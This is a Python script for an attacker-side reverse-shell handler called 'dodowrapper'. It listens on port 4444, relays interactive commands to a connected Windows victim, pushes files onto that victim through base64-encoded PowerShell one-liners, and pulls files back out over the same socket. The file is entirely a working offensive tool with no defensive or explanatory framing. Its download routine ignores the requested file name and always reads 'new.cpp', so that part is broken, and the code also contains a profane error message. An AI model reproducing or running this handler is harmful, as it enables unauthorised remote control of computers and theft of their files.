import socket
import base64
import select
import time

# Create listening service
s = socket.socket()
port = 4444
s.bind(('',port))
s.listen(5)
print('Listening on port',port)

# Print connection information
c, addr = s.accept()
print('Connection received from',addr)

# Main Loop
while True:
    option = input('dodowrapper$ ')
    # Print Help information
    if option == 'help':
        print("""shell     interact with the shell
download  download a file from the target
upload    upload a file to the target""")
    # Interact with shell
    elif option == 'shell':
        while True:
            ready = select.select([c],[],[],5)
            if ready[0]:
                receive = c.recv(4096)
                print(receive.decode(),end='')
            command = input("")
            # Exit shell
            if command == 'exitshell':
                break
            c.send(bytes(command + '\n','utf-8'))
            time.sleep(1)
    # Upload file
    elif option[0:6] == 'upload':
        with open(option[7:],'rb') as f:
            buffer = f.read(400)
            while buffer:
                # Encode file
                encoded = base64.b64encode(buffer)
                # Decode file
                cmd = bytes('powershell -c "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\''+encoded.decode()+'\'))|Out-File -Append -NoNewLine '+f.name+'"\n','utf-8')
                c.send(cmd)
                # Receive reply
                ready = select.select([c],[],[],5)
                if ready[0]:
                    receive = c.recv(4096)
                buffer = f.read(400)
            print('upload successful')
    # Download File
    elif option[0:8] == 'download':
        with open(option[9:],'wb') as f:
            # Clear buffer
            receive = c.recv(4096)
            # Encode File
            cmd = bytes('powershell -c "$dir = Get-Location; $bytes = [System.IO.File]::ReadAllBytes($dir.Path +\'/new.cpp\'); $EncodedText =[Convert]::ToBase64String($Bytes); $split = $EncodedText -split \'(.{0,400})\' | ?{$_};Foreach ($i in $split){$i;Start-Sleep(1);};echo -----END-----"' + '\n','utf-8')
            c.send(cmd)
            # Receive Echo
            receive = c.recv(4096)
            while 1:
                ready = select.select([c],[],[],5)
                if ready[0]:
                    # Decode File
                    receive = c.recv(4096)
                    if '-----END-----' in receive.decode():
                        break
                    f.write(base64.b64decode(receive.decode()))
    # Exit
    elif option == 'exit':
        break
    else:
        print('what the fuck')
c.close()
